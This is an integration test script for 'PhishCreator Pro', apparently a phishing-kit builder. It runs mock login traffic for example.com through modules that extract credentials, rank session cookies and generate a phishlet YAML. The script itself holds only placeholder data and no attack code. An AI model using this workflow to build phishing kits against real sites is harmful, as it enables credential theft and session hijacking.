#!/usr/bin/env python3
"""
Integration Test for PhishCreator Pro
Tests all modules working together
"""

import sys
import os

# Ensure repo root is on sys.path when running as a script (python phishcreator/test_integration.py)
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

# Prefer package imports
from phishcreator.modules.live_traffic_analyzer import LiveAnalysisResult
from phishcreator.modules.auth_flow_classifier import classify_auth_flow
from phishcreator.modules.intelligent_credential_extractor import extract_credentials
from phishcreator.modules.smart_cookie_analyzer import analyze_cookies
from phishcreator.modules.dynamic_phishlet_generator import generate_phishlet


def test_integration():
    """Test complete workflow with mock data"""
    
    print("[*] Testing PhishCreator Pro Integration")
    print("=" * 60)
    
    # Mock live traffic analysis result
    print("\n[1] Creating mock traffic data...")
    traffic_data = {
        'unique_hosts': ['login.example.com', 'api.example.com', 'cdn.example.com'],
        'all_requests': [
            {
                'url': 'https://login.example.com/signin',
                'method': 'POST',
                'headers': {'content-type': 'application/json'},
                'post_data': '{"email":"test@example.com","password":"secret123"}',
                'timestamp': '2025-01-01T00:00:00'
            },
            {
                'url': 'https://api.example.com/auth/validate',
                'method': 'POST',
                'headers': {'content-type': 'application/json'},
                'post_data': '{"token":"xyz"}',
                'timestamp': '2025-01-01T00:00:01'
            }
        ],
        'all_responses': [
            {
                'url': 'https://login.example.com/signin',
                'status': 200,
                'headers': {
                    'content-type': 'application/json',
                    'set-cookie': 'session_id=abc123; HttpOnly; Secure'
                },
                'timestamp': '2025-01-01T00:00:00'
            }
        ],
        'form_submissions': [
            {
                'url': 'https://login.example.com/signin',
                'method': 'POST',
                'content_type': 'application/json',
                'fields': {'email': 'test@example.com', 'password': 'secret123'},
                'detected_username_field': 'email',
                'detected_password_field': 'password',
                'timestamp': '2025-01-01T00:00:00'
            }
        ],
        'cookies_captured': {
            'login.example.com': {
                'session_id': {
                    'name': 'session_id',
                    'value': 'abc123',
                    'domain': 'login.example.com',
                    'httpOnly': True,
                    'secure': True
                }
            },
            'api.example.com': {
                'auth_token': {
                    'name': 'auth_token',
                    'value': 'xyz789',
                    'domain': 'api.example.com'
                }
            }
        }
    }
    print("✓ Mock traffic data created")
    
    # Test auth flow classification
    print("\n[2] Testing auth flow classification...")
    auth_analysis = classify_auth_flow(traffic_data)
    print(f"✓ Auth type detected: {auth_analysis.primary_type}")
    print(f"  Confidence: {auth_analysis.confidence:.2f}")
    print(f"  Multi-step: {auth_analysis.multi_step}")
    
    # Test credential extraction
    print("\n[3] Testing credential extraction...")
    cred_result = extract_credentials(traffic_data['form_submissions'])
    print(f"✓ Credentials extracted:")
    print(f"  Username key: {cred_result.username_key}")
    print(f"  Password key: {cred_result.password_key}")
    print(f"  Confidence: {cred_result.confidence:.2f}")
    
    # Test cookie analysis
    print("\n[4] Testing cookie analysis...")
    cookie_result = analyze_cookies(traffic_data['cookies_captured'], traffic_data)
    print(f"✓ Cookies analyzed:")
    print(f"  Critical cookies: {len(cookie_result.critical_cookies)}")
    print(f"  Important cookies: {len(cookie_result.important_cookies)}")
    print(f"  Auth tokens: {len(cookie_result.auth_tokens)} domains")
    
    # Test complete phishlet generation
    print("\n[5] Testing complete phishlet generation...")
    phishlet_result = generate_phishlet('example.com', traffic_data, 'example')
    print(f"✓ Phishlet generated:")
    print(f"  Confidence: {phishlet_result.confidence:.2f}")
    print(f"  Auth flow type: {phishlet_result.auth_flow_type}")
    print(f"  Warnings: {len(phishlet_result.warnings)}")
    print(f"  Recommendations: {len(phishlet_result.recommendations)}")
    
    # Display phishlet preview
    print("\n[6] Phishlet YAML Preview:")
    print("-" * 60)
    yaml_lines = phishlet_result.phishlet_yaml.split('\n')
    for line in yaml_lines[:30]:  # Show first 30 lines
        print(line)
    if len(yaml_lines) > 30:
        print(f"... ({len(yaml_lines) - 30} more lines)")
    print("-" * 60)
    
    # Summary
    print("\n" + "=" * 60)
    print("[✓] Integration Test Complete!")
    print("=" * 60)
    print(f"\nAll modules working together successfully:")
    print(f"  - Live Traffic Analyzer: ✓")
    print(f"  - Auth Flow Classifier: ✓")
    print(f"  - Credential Extractor: ✓")
    print(f"  - Cookie Analyzer: ✓")
    print(f"  - Dynamic Phishlet Generator: ✓")
    print(f"\nGenerated phishlet confidence: {phishlet_result.confidence:.1%}")
    
    return True


if __name__ == '__main__':
    try:
        success = test_integration()
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"\n[!] Integration test failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
